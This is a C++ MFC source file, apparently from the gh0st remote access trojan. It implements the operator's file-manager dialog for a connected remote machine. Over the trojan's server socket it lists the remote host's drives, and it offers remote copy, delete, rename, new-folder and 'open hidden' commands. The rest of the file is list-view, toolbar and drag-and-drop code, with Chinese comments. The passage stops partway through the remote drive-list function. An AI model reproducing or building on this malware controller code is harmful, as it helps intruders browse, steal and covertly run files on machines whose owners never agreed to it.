// FileManagerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "FileManagerDlg.h"
#include "FileTransferModeDlg.h"
#include "InputDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,
	ID_SEPARATOR
};

typedef struct {
	LVITEM* plvi;
	CString sCol2;
} lvItem, *plvItem;
/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg dialog


CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CFileManagerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CFileManagerDlg)
	//}}AFX_DATA_INIT
	SHFILEINFO	sfi;
	SHGetFileInfo
		(
		"\\\\",
		FILE_ATTRIBUTE_NORMAL, 
		&sfi,
		sizeof(SHFILEINFO), 
		SHGFI_ICON | SHGFI_USEFILEATTRIBUTES
		);
	m_hIcon = sfi.hIcon;	
	HIMAGELIST hImageList;
	// 加載系統圖標列表
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
        sizeof(SHFILEINFO),
		SHGFI_LARGEICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Large = CImageList::FromHandle(hImageList);

	// 加載系統圖標列表
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
        sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Small = CImageList::FromHandle(hImageList);

	// 初始化應該傳輸的數據包大小為0

	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	// 保存遠程驅動器列表
	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
	memcpy(m_bRemoteDriveList, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);

	m_nTransferMode = TRANSFER_MODE_NORMAL;
	m_nOperatingFileLength = 0;
	m_nCounter = 0;

	m_bIsStop = false;
}


void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CFileManagerDlg)
	DDX_Control(pDX, IDC_REMOTE_PATH, m_Remote_Directory_ComboBox);
	DDX_Control(pDX, IDC_LOCAL_PATH, m_Local_Directory_ComboBox);
	DDX_Control(pDX, IDC_LIST_REMOTE, m_list_remote);
	DDX_Control(pDX, IDC_LIST_LOCAL, m_list_local);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialog)
	//{{AFX_MSG_MAP(CFileManagerDlg)
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_LOCAL, OnDblclkListLocal)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_LOCAL, OnBegindragListLocal)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_REMOTE, OnBegindragListRemote)
	ON_WM_MOUSEMOVE()
	ON_WM_LBUTTONUP()
	ON_WM_TIMER()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_REMOTE, OnDblclkListRemote)
	ON_COMMAND(IDT_LOCAL_PREV, OnLocalPrev)
	ON_COMMAND(IDT_REMOTE_PREV, OnRemotePrev)
	ON_COMMAND(IDT_LOCAL_VIEW, OnLocalView)
	ON_COMMAND(IDM_LOCAL_LIST, OnLocalList)
	ON_COMMAND(IDM_LOCAL_REPORT, OnLocalReport)
	ON_COMMAND(IDM_LOCAL_BIGICON, OnLocalBigicon)
	ON_COMMAND(IDM_LOCAL_SMALLICON, OnLocalSmallicon)
	ON_COMMAND(IDM_REMOTE_BIGICON, OnRemoteBigicon)
	ON_COMMAND(IDM_REMOTE_LIST, OnRemoteList)
	ON_COMMAND(IDM_REMOTE_REPORT, OnRemoteReport)
	ON_COMMAND(IDM_REMOTE_SMALLICON, OnRemoteSmallicon)
	ON_COMMAND(IDT_REMOTE_VIEW, OnRemoteView)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_STOP, OnUpdateLocalStop)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_STOP, OnUpdateRemoteStop)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_PREV, OnUpdateLocalPrev)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_PREV, OnUpdateRemotePrev)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_COPY, OnUpdateLocalCopy)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_COPY, OnUpdateRemoteCopy)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_DELETE, OnUpdateRemoteDelete)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_NEWFOLDER, OnUpdateRemoteNewfolder)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_DELETE, OnUpdateLocalDelete)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_NEWFOLDER, OnUpdateLocalNewfolder)
	ON_COMMAND(IDT_REMOTE_COPY, OnRemoteCopy)
	ON_COMMAND(IDT_LOCAL_COPY, OnLocalCopy)
	ON_COMMAND(IDT_LOCAL_DELETE, OnLocalDelete)
	ON_COMMAND(IDT_REMOTE_DELETE, OnRemoteDelete)
	ON_COMMAND(IDT_REMOTE_STOP, OnRemoteStop)
	ON_COMMAND(IDT_LOCAL_STOP, OnLocalStop)
	ON_COMMAND(IDT_LOCAL_NEWFOLDER, OnLocalNewfolder)
	ON_COMMAND(IDT_REMOTE_NEWFOLDER, OnRemoteNewfolder)
	ON_COMMAND(IDM_TRANSFER, OnTransfer)
	ON_COMMAND(IDM_RENAME, OnRename)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_LOCAL, OnEndlabeleditListLocal)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_REMOTE, OnEndlabeleditListRemote)
	ON_COMMAND(IDM_DELETE, OnDelete)
	ON_COMMAND(IDM_NEWFOLDER, OnNewfolder)
	ON_COMMAND(IDM_REFRESH, OnRefresh)
	ON_COMMAND(IDM_LOCAL_OPEN, OnLocalOpen)
	ON_COMMAND(IDM_REMOTE_OPEN_SHOW, OnRemoteOpenShow)
	ON_COMMAND(IDM_REMOTE_OPEN_HIDE, OnRemoteOpenHide)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_LOCAL, OnRclickListLocal)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE, OnRclickListRemote)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg message handlers


int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes)
{
	SHFILEINFO	sfi;
	if (dwFileAttributes == INVALID_FILE_ATTRIBUTES)
		dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		dwFileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo
		(
		lpFileName,
		dwFileAttributes, 
		&sfi,
		sizeof(SHFILEINFO), 
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
		);

	return sfi.iIcon;
}

BOOL CFileManagerDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	RECT	rect;
	GetClientRect(&rect);

	/*為真彩工具條添加的代碼*/

	// 一定要定義工具欄ID，不然RepositionBars會重置工具欄的位置
	// ID 定義在AFX_IDW_CONTROLBAR_FIRST AFX_IDW_CONTROLBAR_LAST
	// 本地工具條 CBRS_TOP 會在工具條上產生一條線
    if (!m_wndToolBar_Local.Create(this, WS_CHILD |
        WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, ID_LOCAL_TOOLBAR) 
		||!m_wndToolBar_Local.LoadToolBar(IDR_TOOLBAR1))
    {
        TRACE0("Failed to create toolbar ");
        return -1; //Failed to create
    }
	m_wndToolBar_Local.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_wndToolBar_Local.LoadTrueColorToolBar
		(
		24,    //加載真彩工具條
		IDB_TOOLBAR,
		IDB_TOOLBAR,
		IDB_TOOLBAR_DISABLE
		);
	// 添加下拉按鈕
	m_wndToolBar_Local.AddDropDownButton(this, IDT_LOCAL_VIEW, IDR_LOCAL_VIEW);


    if (!m_wndToolBar_Remote.Create(this, WS_CHILD |
        WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, ID_REMOTE_TOOLBAR) 
		||!m_wndToolBar_Remote.LoadToolBar(IDR_TOOLBAR2))
    {
        TRACE0("Failed to create toolbar ");
        return -1; //Failed to create
    }
    m_wndToolBar_Remote.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
    m_wndToolBar_Remote.LoadTrueColorToolBar
		(
		24,    //加載真彩工具條    
		IDB_TOOLBAR,
		IDB_TOOLBAR,
		IDB_TOOLBAR_DISABLE
		);
	// 添加下拉按鈕
	m_wndToolBar_Remote.AddDropDownButton(this, IDT_REMOTE_VIEW, IDR_REMOTE_VIEW);

	//顯示工具欄
	m_wndToolBar_Local.MoveWindow(268, 0, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);


	// 設置標題
	CString str;
	str.Format("\\\\%s - 文件管理",m_IPAddress);
	SetWindowText(str);

	// 為列表視圖設置ImageList
	m_list_local.SetImageList(m_pImageList_Large, LVSIL_NORMAL);
	m_list_local.SetImageList(m_pImageList_Small, LVSIL_SMALL);
	// 創建帶進度條的狀態欄
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 50);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //顯示狀態欄	

	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl = new CProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 1);
    m_ProgressCtrl->SetRange(0, 100);           //設置進度條範圍
    m_ProgressCtrl->SetPos(20);                 //設置進度條當前位置
	
	FixedLocalDriveList();
	FixedRemoteDriveList();
	/////////////////////////////////////////////
	//// Set up initial variables
	m_bDragging = false;
	m_nDragIndex = -1;
	m_nDropIndex = -1;
	CoInitialize(NULL);
	SHAutoComplete(GetDlgItem(IDC_LOCAL_PATH)->GetWindow(GW_CHILD)->m_hWnd, SHACF_FILESYSTEM);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CFileManagerDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	// 狀態欄還沒有創建
	if (m_wndStatusBar.m_hWnd == NULL)
		return;
	// 定位狀態欄
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //顯示工具欄
	RECT	rect;
	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl->MoveWindow(&rect);
	
	GetDlgItem(IDC_LIST_LOCAL)->MoveWindow(0, 36, cx, (cy - 100) / 2);
	GetDlgItem(IDC_LIST_REMOTE)->MoveWindow(0, (cy / 2) + 28, cx, (cy - 100) / 2);
	GetDlgItem(IDC_STATIC_REMOTE)->MoveWindow(20, cy / 2, 25, 20);
	GetDlgItem(IDC_REMOTE_PATH)->MoveWindow(53, (cy / 2) - 4 , 210, 12);


	GetClientRect(&rect);
	//顯示工具欄
	m_wndToolBar_Local.MoveWindow(268, 0, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);
}

void CFileManagerDlg::FixedLocalDriveList()
{
	char	DriveString[256];
	char	*pDrive = NULL;
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0) != 0);
	m_list_local.InsertColumn(0, "名稱",  LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "類型", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "總大小", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "可用空間", LVCFMT_LEFT, 115);

	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	pDrive = DriveString;

	char	FileSystem[MAX_PATH];
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // 總大小
	unsigned long		FreeMB = 0; // 剩餘空間

	for (int i = 0; *pDrive != '\0'; i++, pDrive += lstrlen(pDrive) + 1)
	{
		// 得到磁盤相關信息
		memset(FileSystem, 0, sizeof(FileSystem));
		// 得到文件系統信息及大小
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		
		int	nFileSystemLen = lstrlen(FileSystem) + 1;
		if (GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		

		int	nItem = m_list_local.InsertItem(i, pDrive, GetIconIndex(pDrive, GetFileAttributes(pDrive)));
		m_list_local.SetItemData(nItem, 1);
		if (lstrlen(FileSystem) == 0)
		{
			SHFILEINFO	sfi;
			SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
			m_list_local.SetItemText(nItem, 1, sfi.szTypeName);
		}
		else
		{
			m_list_local.SetItemText(nItem, 1, FileSystem);
		}
		CString	str;
		str.Format("%10.1f GB", (float)AmntMB / 1024);
		m_list_local.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_local.SetItemText(nItem, 3, str);
	}
	// 重置本地當前路徑
	m_Local_Path = "";
	m_Local_Directory_ComboBox.ResetContent();

	ShowMessage("本地：裝載目錄 %s 完成", m_Local_Path);
}

void CFileManagerDlg::OnDblclkListLocal(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	if (m_list_local.GetSelectedCount() == 0 || m_list_local.GetItemData(m_list_local.GetSelectionMark()) != 1)
		return;
	FixedLocalFileList();
	*pResult = 0;
}

void CFileManagerDlg::FixedLocalFileList(CString directory)
{
	if (directory.GetLength() == 0)
	{
		int	nItem = m_list_local.GetSelectionMark();

		// 如果有選中的，是目錄
		if (nItem != -1)
		{
			if (m_list_local.GetItemData(nItem) == 1)
			{
				directory = m_list_local.GetItemText(nItem, 0);
			}
		}
		// 從組合框裡得到路徑
		else
		{
			m_Local_Directory_ComboBox.GetWindowText(m_Local_Path);
		}
	}




	// 得到父目錄
	if (directory == "..")
	{
		m_Local_Path = GetParentDirectory(m_Local_Path);
	}
	// 刷新當前用
	else if (directory != ".")
	{	
		m_Local_Path += directory;
		if(m_Local_Path.Right(1) != "\\")
			m_Local_Path += "\\";
	}


	// 是驅動器的根目錄,返回磁盤列表
	if (m_Local_Path.GetLength() == 0)
	{
		FixedLocalDriveList();
		return;
	}

	m_Local_Directory_ComboBox.InsertString(0, m_Local_Path);
	m_Local_Directory_ComboBox.SetCurSel(0);

	// 重建標題
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0) != 0);
	m_list_local.InsertColumn(0, "名稱",  LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "類型", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);

	int			nItemIndex = 0;
	m_list_local.SetItemData
		(
		m_list_local.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1
		);

	// i 為 0 時列目錄，i 為 1時列文件
	for (int i = 0; i < 2; i++)
	{
		CFileFind	file;
		BOOL		bContinue;
		bContinue = file.FindFile(m_Local_Path + "*.*");
		while (bContinue)
		{	
			bContinue = file.FindNextFile();
			if (file.IsDots())	
				continue;
			bool bIsInsert = !file.IsDirectory() == i;
	
			if (!bIsInsert)
				continue;

			int nItem = m_list_local.InsertItem(nItemIndex++, file.GetFileName(), 
				GetIconIndex(file.GetFileName(), GetFileAttributes(file.GetFilePath())));
			m_list_local.SetItemData(nItem,	file.IsDirectory());
			SHFILEINFO	sfi;
			SHGetFileInfo(file.GetFileName(), FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);   
			m_list_local.SetItemText(nItem, 2, sfi.szTypeName);

			CString str;
			str.Format("%10d KB", file.GetLength() / 1024 + (file.GetLength() % 1024 ? 1 : 0));
			m_list_local.SetItemText(nItem, 1, str);
			CTime time;
			file.GetLastWriteTime(time);
			m_list_local.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));
		}
	}

	ShowMessage("本地：裝載目錄 %s 完成", m_Local_Path);
}

void CFileManagerDlg::DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList)
{
	//This routine performs the actual drop of the item dragged.
	//It simply grabs the info from the Drag list (pDragList)
	// and puts that info into the list dropped on (pDropList).
	//Send:	pDragList = pointer to CListCtrl we dragged from,
	//		pDropList = pointer to CListCtrl we are dropping on.
	//Return: nothing.

	////Variables
	// Unhilight the drop target

	if(pDragList == pDropList) //we are return
	{
		return;
	} //EO if(pDragList...


	pDropList->SetItemState(m_nDropIndex, 0, LVIS_DROPHILITED);

	if ((CWnd *)pDropList == &m_list_local)
	{
		OnRemoteCopy();
	}
	else if ((CWnd *)pDropList == &m_list_remote)
	{
		OnLocalCopy();
	}
	else
	{
		// 見鬼了
		return;
	}
	// 重置
	m_nDropIndex = -1;
//	靠，下面的代碼不要了，複製文件了
// 	if(pDragList->GetSelectedCount() == 1)
// 	{
// 		char	szLabel[MAX_PATH];
// 		LVITEM	lviT;
// 		ZeroMemory(&lviT, sizeof (LVITEM)); //allocate and clear memory space for LV_ITEM
// 		lviT.iItem		= m_nDragIndex;
// 		lviT.mask		= LVIF_IMAGE | LVIF_TEXT;
// 		lviT.pszText	= szLabel;
// 		lviT.cchTextMax	= MAX_PATH;
// 		pDragList->GetItem (&lviT);
// 
// 		// Select the new item we just inserted
// 		int	iItem = (m_nDropIndex == -1) ? pDropList->GetItemCount () : m_nDropIndex;
// 
// 		pDropList->InsertItem(iItem, szLabel, lviT.iImage);
// 
// 		pDropList->SetItemState (iItem, LVIS_SELECTED, LVIS_SELECTED);
// 	}
// 	else //more than 1 item is being dropped
// 	{
// 		POSITION pos = pDragList->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
// 		while(pos) //so long as we have a valid POSITION, we keep iterating
// 		{
// 			m_nDragIndex = pDragList->GetNextSelectedItem(pos);
// 			m_nDropIndex = (m_nDropIndex == -1) ? pDropList->GetItemCount() : m_nDropIndex;	
// 
// 			char	szLabel[MAX_PATH];
// 			LVITEM	lviT;
// 			ZeroMemory(&lviT, sizeof (LVITEM)); //allocate and clear memory space for LV_ITEM
// 			lviT.iItem		= m_nDragIndex;
// 			lviT.mask		= LVIF_IMAGE | LVIF_TEXT;
// 			lviT.pszText	= szLabel;
// 			lviT.cchTextMax	= MAX_PATH;
// 			pDragList->GetItem (&lviT);
// 
// 			pDropList->InsertItem(m_nDropIndex, szLabel, lviT.iImage);
// 			pDropList->SetItemState(m_nDropIndex, LVIS_SELECTED, LVIS_SELECTED);
// 			m_nDropIndex ++;
// 			//Save the pointer to the new item in our CList
// 		} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
// 	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CFileManagerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CFileManagerDlg::OnBegindragListLocal(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	//// Save the index of the item being dragged in m_nDragIndex
	////  This will be used later for retrieving the info dragged
	m_nDragIndex = pNMListView->iItem;
	
	if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(".."))
		return;

	//We will call delete later (in LButtonUp) to clean this up
	
   	if(m_list_local.GetSelectedCount() > 1) //more than 1 item in list is selected
   		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
   	else
   		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);
	
	ASSERT(m_hCursor); //make sure it was created
	//// Change the cursor to the drag image
	////	(still must perform DragMove() in OnMouseMove() to show it moving)
	
	//// Set dragging flag and others
	m_bDragging = TRUE;	//we are in a drag and drop operation
	m_nDropIndex = -1;	//we don't have a drop index yet
	m_pDragList = &m_list_local; //make note of which list we are dragging from
	m_pDropWnd = &m_list_local;	//at present the drag list is the drop list
	
	//// Capture all mouse messages
	SetCapture();
	*pResult = 0;
}

void CFileManagerDlg::OnBegindragListRemote(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	//// Save the index of the item being dragged in m_nDragIndex
	////  This will be used later for retrieving the info dragged
	m_nDragIndex = pNMListView->iItem;
	if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(".."))
		return;	
	
	
	//We will call delete later (in LButtonUp) to clean this up
	
   	if(m_list_remote.GetSelectedCount() > 1) //more than 1 item in list is selected
		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
   	else
		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);
	
	ASSERT(m_hCursor); //make sure it was created
	//// Change the cursor to the drag image
	////	(still must perform DragMove() in OnMouseMove() to show it moving)
	
	//// Set dragging flag and others
	m_bDragging = TRUE;	//we are in a drag and drop operation
	m_nDropIndex = -1;	//we don't have a drop index yet
	m_pDragList = &m_list_remote; //make note of which list we are dragging from
	m_pDropWnd = &m_list_remote;	//at present the drag list is the drop list
	
	//// Capture all mouse messages
	SetCapture ();
	*pResult = 0;
}

void CFileManagerDlg::OnMouseMove(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	//While the mouse is moving, this routine is called.
	//This routine will redraw the drag image at the present
	// mouse location to display the dragging.
	//Also, while over a CListCtrl, this routine will highlight
	// the item we are hovering over.

	//// If we are in a drag/drop procedure (m_bDragging is true)
	if (m_bDragging)
	{	
		//SetClassLong(m_list_local.m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DRAG));

		//// Move the drag image
		CPoint pt(point);	//get our current mouse coordinates
		ClientToScreen(&pt); //convert to screen coordinates
		
		//// Get the CWnd pointer of the window that is under the mouse cursor
		CWnd* pDropWnd = WindowFromPoint (pt);

		ASSERT(pDropWnd); //make sure we have a window

		//// If we drag outside current window we need to adjust the highlights displayed
		if (pDropWnd != m_pDropWnd)
		{
			if (m_nDropIndex != -1) //If we drag over the CListCtrl header, turn off the hover highlight
			{
				TRACE("m_nDropIndex is -1\n");
				CListCtrl* pList = (CListCtrl*)m_pDropWnd;
				VERIFY (pList->SetItemState (m_nDropIndex, 0, LVIS_DROPHILITED));
				// redraw item
				VERIFY (pList->RedrawItems (m_nDropIndex, m_nDropIndex));
				pList->UpdateWindow ();
				m_nDropIndex = -1;
			}
		}
		
		// Save current window pointer as the CListCtrl we are dropping onto
		m_pDropWnd = pDropWnd;

		// Convert from screen coordinates to drop target client coordinates
		pDropWnd->ScreenToClient(&pt);
		
		//If we are hovering over a CListCtrl we need to adjust the highlights
		if(pDropWnd->IsKindOf(RUNTIME_CLASS (CListCtrl)))
		{			
			//Note that we can drop here
			SetCursor(m_hCursor);

			if (m_pDropWnd->m_hWnd == m_pDragList->m_hWnd)
				return;

			UINT uFlags;
			CListCtrl* pList = (CListCtrl*)pDropWnd;
			
			// Turn off hilight for previous drop target
			pList->SetItemState (m_nDropIndex, 0, LVIS_DROPHILITED);
			// Redraw previous item
			pList->RedrawItems (m_nDropIndex, m_nDropIndex);
			
			// Get the item that is below cursor
			m_nDropIndex = ((CListCtrl*)pDropWnd)->HitTest(pt, &uFlags);
			if (m_nDropIndex != -1)
			{
				// Highlight it
				pList->SetItemState(m_nDropIndex, LVIS_DROPHILITED, LVIS_DROPHILITED);
				// Redraw item
				pList->RedrawItems(m_nDropIndex, m_nDropIndex);
				pList->UpdateWindow();
			}
		}
		else
		{
			//If we are not hovering over a CListCtrl, change the cursor
			// to note that we cannot drop here
			SetCursor(LoadCursor(NULL, IDC_NO));
		}
	}	
	CDialog::OnMouseMove(nFlags, point);
}

void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	//This routine is the end of the drag/drop operation.
	//When the button is released, we are to drop the item.
	//There are a few things we need to do to clean up and
	// finalize the drop:
	//	1) Release the mouse capture
	//	2) Set m_bDragging to false to signify we are not dragging
	//	3) Actually drop the item (we call a separate function to do that)
	
	//If we are in a drag and drop operation (otherwise we don't do anything)
	if (m_bDragging)
	{
		// Release mouse capture, so that other controls can get control/messages
		ReleaseCapture();
		
		// Note that we are NOT in a drag operation
		m_bDragging = FALSE;
		
		CPoint pt (point); //Get current mouse coordinates
		ClientToScreen (&pt); //Convert to screen coordinates
		// Get the CWnd pointer of the window that is under the mouse cursor
		CWnd* pDropWnd = WindowFromPoint (pt);
		ASSERT (pDropWnd); //make sure we have a window pointer
		// If window is CListCtrl, we perform the drop
		if (pDropWnd->IsKindOf (RUNTIME_CLASS (CListCtrl)))
		{
			m_pDropList = (CListCtrl*)pDropWnd; //Set pointer to the list we are dropping on
			DropItemOnList(m_pDragList, m_pDropList); //Call routine to perform the actual drop
		}
	}	
	CDialog::OnLButtonUp(nFlags, point);
}

BOOL CFileManagerDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		if (pMsg->wParam == VK_ESCAPE)
				return true;
		if (pMsg->wParam == VK_RETURN)
		{
			if (
				pMsg->hwnd == m_list_local.m_hWnd || 
				pMsg->hwnd == ((CEdit*)m_Local_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd
				)
			{
				FixedLocalFileList();
			}
			else if 
				(
				pMsg->hwnd == m_list_remote.m_hWnd ||
				pMsg->hwnd == ((CEdit*)m_Remote_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd
				)
			{
				GetRemoteFileList();
			}
			return TRUE;
		}
		
	}
	// 單擊除了窗口標題欄以外的區域使窗口移動
	if (pMsg->message == WM_LBUTTONDOWN && pMsg->hwnd == m_hWnd)
	{
		pMsg->message = WM_NCLBUTTONDOWN;
		pMsg->wParam = HTCAPTION;
	}
	/*
	UINT CFileManagerDlg::OnNcHitTest (Cpoint point )
	{
		UINT nHitTest =Cdialog: : OnNcHitTest (point )
			return (nHitTest = =HTCLIENT)? HTCAPTION : nHitTest
	}
	
	上述技術有兩點不利之處，
		其一是在窗口的客戶區域雙擊時，窗口將極大；
		其二， 它不適合包含幾個視窗的主框窗口。
	*/


	if(m_wndToolBar_Local.IsWindowVisible())
	{
		CWnd* pWndParent = m_wndToolBar_Local.GetParent();
		m_wndToolBar_Local.OnUpdateCmdUI((CFrameWnd*)this, TRUE);
	}
	if(m_wndToolBar_Remote.IsWindowVisible())
	{
		CWnd* pWndParent = m_wndToolBar_Remote.GetParent();
		m_wndToolBar_Remote.OnUpdateCmdUI((CFrameWnd*)this, TRUE);
	}

	return CDialog::PreTranslateMessage(pMsg);
}
void CFileManagerDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	m_ProgressCtrl->StepIt();
	CDialog::OnTimer(nIDEvent);
}

void CFileManagerDlg::FixedRemoteDriveList()
{
	// 加載系統統圖標列表 設置驅動器圖標列表
	HIMAGELIST hImageListLarge = NULL;
	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(&hImageListLarge, &hImageListSmall);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

	m_list_remote.DeleteAllItems();
	// 重建Column
	while(m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, "名稱",  LVCFMT_LEFT, 200);
	m_list_remote.InsertColumn(1, "類型", LVCFMT_LEFT, 100);
